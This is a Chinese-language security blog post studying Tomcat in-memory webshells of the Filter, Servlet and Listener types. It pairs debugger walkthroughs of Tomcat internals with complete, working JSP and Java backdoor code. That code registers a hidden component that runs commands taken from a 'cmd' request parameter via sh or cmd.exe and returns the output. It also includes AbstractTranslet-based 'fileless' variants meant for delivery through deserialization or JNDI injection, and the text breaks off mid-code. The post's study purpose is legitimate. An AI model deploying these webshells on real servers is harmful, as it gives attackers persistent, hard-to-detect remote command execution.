title: Tomcat内存马学习
author: bmth
tags:
  - 内存马
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/593c40a86e7542a385ea771756967b1b.png'
cover: 'https://img-blog.csdnimg.cn/593c40a86e7542a385ea771756967b1b.png'
date: 2022-09-10 11:37:00
---
![](https://img-blog.csdnimg.cn/593c40a86e7542a385ea771756967b1b.png)

内存马是无文件Webshell，什么是无文件webshell呢？简单来说，就是服务器上不会存在需要链接的webshell脚本文件，**内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码**

>向各种中间件和框架注入内存马的基础，就是要获得context，所谓context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象

## Tomcat内存马
[Tomcat架构原理](https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86)

首先需要了解tomcat的一些处理机制以及结构，这样才能了解内存马
Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper：
- Engine，实现类为 `org.apache.catalina.core.StandardEngine`
- Host，实现类为 `org.apache.catalina.core.StandardHost`
- Context，实现类为 `org.apache.catalina.core.StandardContext`
- Wrapper，实现类为 `org.apache.catalina.core.StandardWrapper`

每个Wrapper实例表示一个具体的Servlet定义，StandardWrapper是Wrapper接口的标准实现类
![](https://img-blog.csdnimg.cn/f73077e9e6ac41dd877fee41da7f120d.png)
可以看到，如果我们想要添加一个Servlet，需要创建一个Wrapper包裹他来挂载到Context(StandardContext中)


Tomcat的加载流程：
![](https://img-blog.csdnimg.cn/d9d2eb30c29e4c35a9cda0136a5f102f.png)

JavaWeb三大组件的调用顺序： `Listener->Filter->Servlet`

### Filter
Filter译为过滤器，过滤器实际上就是对web资源进行拦截，做一些处理后再交给下一个过滤器或servlet处理，通常都是用来拦截request进行处理的，也可以对返回的response进行拦截处理
![](https://img-blog.csdnimg.cn/ed90ed9608884fa09baf04cf5510e130.png)
#### 流程分析

先来分析一下正常Filter的流程是怎么样的，实现一个filter类：
```java
import javax.servlet.*;
import java.io.IOException;

public class filterDemo implements Filter {
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤操作");
        filterChain.doFilter(servletRequest,servletResponse);
    }
    public void destroy() {}
}
```
在web.xml中注册我们的filter
![](https://img-blog.csdnimg.cn/c703dd2b437b4a209ffa0e07512d910c.png)
在`filterChain.doFilter`处下好断点，debug进行调试，主要的调用栈如下
```
doFilter:11, filterDemo
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
```
看到在`ApplicationFilterChain#internalDoFilter`中从filterConfig获取filter对象，然后调用doFilter
![](https://img-blog.csdnimg.cn/0acfa92d01764c09a0e1c63913c57ef3.png)
继续往上跟进
![](https://img-blog.csdnimg.cn/d8220ac071dd4eec981abc16e77160c7.png)
再往上看到在`StandardWrapperValve#invoke`调用了doFilter，这才能走到ApplicationFilterChain的doFilter
![](https://img-blog.csdnimg.cn/4d13a6c0bb3c40b4a36bc4642fd00f08.png)
我们看看`filterChain`是如何获取的，发现使用`ApplicationFilterFactory.createFilterChain`创建了一个ApplicationFilterChain
![](https://img-blog.csdnimg.cn/b70b93612dc34e518a59f030f7817db0.png)
跟进createFilterChain，看到首先会调用 getParent 获取当前 Context (即当前 Web应用)，然后会从 Context 中获取到 filterMaps
![](https://img-blog.csdnimg.cn/40e9ccec3b7e415aaf4f001b597617a5.png)
发现会遍历 filterMaps 中的 filterMap，并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功或就会进入 if 判断，会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 filterConfig，如果不为null，就会调用addFilter
![](https://img-blog.csdnimg.cn/5c32dffee12a48b49ce4eabeaec4a510.png)
在addFilter函数中首先会遍历filters，判断我们的filter是否已经存在(去重)
下面这个 if 判断其实就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中

继续往上分析
![](https://img-blog.csdnimg.cn/c49d126a9be5443090e44bd430fcc289.png)
发现wrapper是`request.getWrapper()`得到的
具体流程：
>1.在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配
2.如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig
3.如果获取到 filterConfig，则将其加入到 filterChain 中
4.后续将会循环 filterChain 中的全部 filterConfig，通过 getFilter 方法获取 Filter 并执行 Filter 的 doFilter 方法

不难发现最开始是从 StandardContext 中获取的 FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存shell

#### jsp内存马
如何获取StandardContext就是关键了

>可以向Tomcat的webapp目录下上传JSP文件的情况下，JSP文件里可以就直接调用request对象，因为Tomcat编码JSP文件为java文件时，会自动将request对象放加进去。这时只需要一步一步获取standardContext即可

```java
//获取当前的ServletContext
ServletContext servletContext = request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
//ApplicationContext为ServletContext 的实现类
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
//获取到standardContext
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```
获取到 StandardContext 之后 ，我们可以发现其中的 filterConfigs，filterDefs，filterMaps 这三个参数和我们的 filter 有关
![](https://img-blog.csdnimg.cn/055b3cd212f547f681446daa4ef927c1.png)
可以看到standardContext 有这三个方法可以添加我们的filter设置
![](https://img-blog.csdnimg.cn/8b9ed658caa046d6b495764438d32231.png)


**filter内存马实现步骤：**
1. 获取StandardContext
2. 创建一个恶意filter
3. 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中
4. 实例化一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到StandardContext.filterMaps中(一般会放在首位)
5. 通过反射获取filterConfigs，实例化一个filterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDef，存放到filterConfigs中

最后的jsp内存马：
```java
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "memshell";
    //获取当前的ServletContext
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    //ApplicationContext为ServletContext 的实现类
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    //获取standardContext
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

	//获取filterConfigs
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
            }
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                //这里写上我们后门的主要代码
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                    InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
                    String output = scanner.hasNext() ? scanner.next() : "";
                    servletResponse.getWriter().write(output);
                    servletResponse.getWriter().flush();
                    return;
                }
                //别忘记带这个，不然的话其他的过滤器可能无法使用
                filterChain.doFilter(servletRequest,servletResponse);
            }
            @Override
            public void destroy() {
            }
        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());

        // 将filterDef添加到filterDefs中
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        //拦截的路由规则，/* 表示拦截任意路由
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("注入成功");
    }
%>
```
![](https://img-blog.csdnimg.cn/216d8e9901c9454f84b16607e7615cd9.png)
接下来访问任意路由试一下，成功植入内存马
![](https://img-blog.csdnimg.cn/d299405f29b142fb95b851c29ae09a43.png)
严格意义上来说不能算是内存WebShell，因为在Tomcat编译jsp文件的时候，会在Tomcat目录下有文件落地
![](https://img-blog.csdnimg.cn/e76cc59e14a34accab09c9b11558b135.png)

#### 无文件内存马
在没有request下，比如说反序列化漏洞、JNDI注入等，我们就需要先获取request，而获取request的操作之前已经学习过了，直接给出代码吧
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;
import javax.servlet.Filter;

public class EvilFilter extends AbstractTranslet implements Filter{
    static{
        try {
            final String name = "shell";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null) {
                Filter filter = new EvilFilter();

                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());

                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(name, filterConfig);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException{}
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException,ServletException{
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null){
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }
    @Override
    public void destroy() {}

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
}
```

该方法只支持 Tomcat 7.x 以上，因为 `javax.servlet.DispatcherType` 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3

tomcat 7 与 tomcat 8、9 在 FilterDef 和 FilterMap 这两个类所属的包名不太一样
>tomcat 7:
org.apache.catalina.deploy.FilterDef
org.apache.catalina.deploy.FilterMap
tomcat 8、9:
org.apache.tomcat.util.descriptor.web.FilterDef
org.apache.tomcat.util.descriptor.web.FilterMap


这里看到一篇文章：[Java内存马：一种Tomcat全版本获取StandardContext的新方法](https://xz.aliyun.com/t/9914)
在每个Tomcat版本下，都会开一个http-nio-端口-Acceptor的线程，Acceptor是用来接收请求的，这些请求自然会交给后面的Engine->Host->Context->servlet，分析发现成功得到了StandardContext
![](https://img-blog.csdnimg.cn/4db3466c64654270801d75063ad70c75.png)
这里测试发现存在bug，仅学习一个思路

参考：
[Java安全之基于Tomcat实现内存马](https://www.cnblogs.com/nice0e3/p/14622879.html)
[Tomcat动态注册filter](http://bubb1e.com/2021/04/21/Tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cfilter/)
[Tomcat 内存马学习(一)：Filter型](http://wjlshare.com/archives/1529)
[java Filter内存马分析 ](https://xz.aliyun.com/t/10888)

### Servlet
Servlet 是服务端的 Java 应用程序，用于处理HTTP请求，做出相应的响应
![](https://img-blog.csdnimg.cn/4d2dbbc575fc432da77807ee7f529707.png)


#### 流程分析
要注入servlet，就需要在tomcat启动之后动态添加Servlet
在Tomcat7之后的版本，StandardContext中提供了动态注册Servlet的方法，但是并未实现
![](https://img-blog.csdnimg.cn/0b6731e67d114a96b78860c1f18a8ef3.png)
所以我们需要自己去实现动态添加Servlet的功能，先看一下**Servlet的初始化**

在`org.apache.catalina.core.StandardWrapper#setServletClass()`处下断点调试，回溯到上一层的`ContextConfig.configureConetxt()`
![](https://img-blog.csdnimg.cn/f814b74d55f04115965ed893c6f6d996.png)
可以看到ContextConfig类中存在Wrapper的初始化流程
首先调用createWapper()创建了wrapper，然后调用set方法配置wrapper相关的属性
![](https://img-blog.csdnimg.cn/9a41f5604a7b41afbc6136a699dfffdd.png)
需要留意的一个特殊属性是`LoadOnStartUp`属性，它是一个启动优先级
继续往后看，配置了wrapper的servletClass
![](https://img-blog.csdnimg.cn/8e4070b691cb4806970ee6bbd8b86e35.png)
配置完成之后会将wrapper放入StandardContext的child里面
![](https://img-blog.csdnimg.cn/335a7d660f8744e382e4e7d8ca201198.png)
接着会调用`StandardContext.addServletMappingDecoded()`添加servlet对应的映射
![](https://img-blog.csdnimg.cn/3b57fbbaeced4b76a70f1aef505785d7.png)
这里会遍历web.xml中所有配置的Servlet-Mapping，通过`StandardContext.addServletMappingDecoded()`将url路径和servlet类做映射

总结一下，Servlet的生成与动态添加依次进行了以下步骤:
>1.通过 context.createWapper() 创建 Wapper 对象
2.设置 Servlet 的 LoadOnStartUp 的值
3.设置 Servlet 的 Name
4.设置 Servlet 对应的 Class
5.将 Servlet 添加到 context 的 children 中
6.将 url 路径和 servlet 类做映射


初始化差不多跟完了，再看一下**Servlet装载流程分析**
在`org.apache.catalina.core.StandardWapper#loadServlet()`处下断点调试，回溯到`StandardContext.startInternal()`方法
![](https://img-blog.csdnimg.cn/1746679f90804906a25428a7c833c0b9.png)
可以看到，是在加载完Listener和Filter之后，才装载Servlet
![](https://img-blog.csdnimg.cn/14a549b166334b5d8ec57044d9bae6ac.png)
这里调用了`findChildren()`方法从StandardContext中拿到所有的child并传到`loadOnStartUp()`方法处理，跟到`loadOnstartup()`

首先获取Context下所有的Wrapper类，并获取到每个Servlet的启动顺序，筛选出 >= 0 的项加载到一个存放Wapper的list中，然后对每个wrapper进行加载
![](https://img-blog.csdnimg.cn/99fce15577d54381970ffdbfd9bab53d.png)
如果没有声明 loadOnStartup 属性(默认为-1)
![](https://img-blog.csdnimg.cn/fac539eaf2f14e3ba1840146b5e200c2.png)
#### jsp内存马
前面说过，Tomcat的一个Wrapper代表一个Servlet ，而Servlet的Wrapper对象均在StandardContext的children属性中
所以这里创建一个Wrapper对象，把servlet写进去后直接用standardContext.addChild()添加到children即可

**Servlet内存马实现步骤：**
1. 找到StandardContext
2. 创建恶意Servlet
3. 用Wrapper对其进行封装
2. 添加封装后的恶意Wrapper到StandardContext的children当中
3. 添加ServletMapping将访问的URL和Servlet进行绑定 


最后的jsp内存马如下：
```java
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>

<%
    // 创建恶意Servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };

    // 获取StandardContext
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();

    // 用Wrapper对其进行封装
    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
    // 新增servlet
    newWrapper.setName("memshell");
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());

    // 添加封装后的恶意Wrapper到StandardContext的children当中
    standardCtx.addChild(newWrapper);
    // 添加ServletMapping将访问的URL和Servlet进行绑定
    standardCtx.addServletMappingDecoded("/shell","memshell");
%>
```
![](https://img-blog.csdnimg.cn/9817cab2297b429695c33380fca2341e.png)

#### 无文件内存马

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class TomcatServlet extends AbstractTranslet implements Servlet{
    static{
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            TomcatServlet Servlet = new TomcatServlet();

            Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
            Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);

            Method gname = Container.class.getDeclaredMethod("setName", String.class);
            gname.invoke(greetWrapper,"shell");

            Method gload = Wrapper.class.getDeclaredMethod("setLoadOnStartup", int.class);
            gload.invoke(greetWrapper,1);

            Method gservlet = Wrapper.class.getDeclaredMethod("setServlet", Servlet.class);
            gservlet.invoke(greetWrapper,Servlet);

            Method gclass = Wrapper.class.getDeclaredMethod("setServletClass", String.class);
            gclass.invoke(greetWrapper,Servlet.getClass().getName());

            Method gchild = StandardContext.class.getDeclaredMethod("addChild",Container.class);
            gchild.invoke(standardContext,greetWrapper);

            Method gmap = StandardContext.class.getDeclaredMethod("addServletMappingDecoded",String.class,String.class,boolean.class);
            gmap.invoke(standardContext,"/shell", "shell",false);
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }
    @Override
    public void init(ServletConfig config) throws ServletException {}

    @Override
    public String getServletInfo() {return null;}

    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse resp = (HttpServletResponse) servletResponse;
        if (req.getParameter("cmd") != null){
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            Process process = Runtime.getRuntime().exec(cmds);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        else{
            resp.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }
}
```

参考：
[Tomcat-Servlet型内存马](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/)
[擅长捉弄的内存马同学：Servlet内存马](https://www.freebuf.com/articles/web/322580.html)
[Java安全之基于Tomcat的Servlet&Listener内存马](https://www.cnblogs.com/CoLo/p/15782888.html)


### Listener
Listener 是用于监听某些特定动作的监听器，当特定动作发生时，监听该动作的监听器就会自动调用对应的方法，用来监听对象或者流程的创建与销毁

下面是一个HttpSession的Listener示意图：
![](https://img-blog.csdnimg.cn/320635256113464984c1c95ee00ffee5.png)

Listener的监听对象主要有三种类型：
1. ServletContext域对象——实现ServletContextListener接口
生命周期：
创建——启动服务器时创建
销毁——关闭服务器或者从服务器移除项目
作用：利用ServletContextListener监听器在创建ServletContext域对象时完成一些想要初始化的工作或者执行自定义任务调度
2. ServletRequest域对象——实现ServletRequestListener接口
生命周期：
创建——访问服务器任何资源都会发送请求(ServletRequest)出现，访问.html和.jsp和.servlet都会创建请求
销毁——服务器已经对该次请求做出了响应
3. HttpSession域对象——实现HttpSessionListener接口
生命周期：
创建——只要调用了getSession()方法就会创建，一次会话只会创建一次
销毁——1.超时(默认为30分钟) // 2.非正常关闭，销毁 // 3.正常关闭服务器(序列化)
作用：每位用户登录网站时都会创建一个HTTPSession对象，利用这个统计在线人数



在 `ServletRequestListener`接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马
![](https://img-blog.csdnimg.cn/e10169758e984fa4ada3c383506bf7c5.png)
#### 流程分析
首先编写一个Listener，下好断点并写入web.xml
```java
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class ServletListener implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("request init");
    }
}
```
![](https://img-blog.csdnimg.cn/695546e7ec40428bbbc459b37d1282dc.png)
```
    <listener>
        <listener-class>ServletListener</listener-class>
    </listener>
```
顺着堆栈向上看可以很快的定位到 `StandardContext#listenerStart` 方法
可以看到它先调用`findApplicationListeners()`获取Listener的名字，然后实例化
![](https://img-blog.csdnimg.cn/e729dafbf112472b8db8aed0330cfafd.png)
看到`findApplicationListeners`函数就是获取 applicationListeners 属性的
![](https://img-blog.csdnimg.cn/83a65815dc2a44279e02f2d783e10ce4.png)
而 applicationListeners 数组中存放的就是我们 Listener 的名字
![](https://img-blog.csdnimg.cn/d165d43261cf4edcbdae713101dbec45.png)
继续往下，发现会遍历results中的Listener，根据不同的类型放入不同的数组，我们这里的ServletRequestListener放入eventListeners数组中
![](https://img-blog.csdnimg.cn/6e9529cadb394e62ad580e8a3b1e89b6.png)

然后通过调用`getApplicationEventListeners()`获取`applicationEventListenersList`中的值
![](https://img-blog.csdnimg.cn/76812f12a6064565b7b024b81f57e389.png)

最后调用`setApplicationEventListeners`对applicationEventListenersList进行设置
![](https://img-blog.csdnimg.cn/d3339aac96e74049adf930d880febb4c.png)
至此 listenerStart 函数的主要部分就结束了

>在前面的函数部分我们知道了 listenerStart() 将我们的 Listener 实例化添加到了 applicationEventListenersList 中，那么只存进去是不可能触发的，我们的 Listener 需要触发肯定需要一个函数点来调用

跟一下第二个断点
根据调用堆栈我们找到了`fireRequestInitEvent()`方法
看到调用了`listener.requestInitialized(event)`，而这个 listener 就是我们设置的 Listener 实例，可以看到是通过遍历 instances 数组获取，而 instances 数组就是通过 getApplicationEventListeners 方法来进行获取的值
![](https://img-blog.csdnimg.cn/0a6a7cf564944f929d2e680e0b996638.png)
#### jsp内存马
根据上面的分析我们知道Listener来源于tomcat初始化时web.xml实例化的Listener和`applicationEventListenersList`中的Listener，前者我们无法控制，但是后者我们可以控制，只需要往`applicationEventListenersList`中加入我们的恶意Listener即可

**Listener内存马实现步骤：**
1. 获取StandardContext
2. 创建恶意Listener
3. 调用StandardContext.addApplicationEventListener()添加恶意Listener


最后的jsp内存马如下：
```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    ServletRequestListener servletRequestListener = new ServletRequestListener() {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");
            if (cmd != null) {
                try {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    response.getOutputStream().write(output.getBytes());
                    response.getOutputStream().flush();
                    response.getOutputStream().close();
                    return;
                } catch (IOException e) {
                }
            }
        }
    };
    standardContext.addApplicationEventListener(servletRequestListener);
    out.println("inject success");
%>
```
![](https://img-blog.csdnimg.cn/8218b5e10db0427ba9bed8ee085a27f7.png)
#### 无文件内存马
```java
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class EvilListener implements ServletRequestListener {
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            EvilListener servletRequestListener = new EvilListener();
            Method addlistener = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addApplicationEventListener", Object.class);
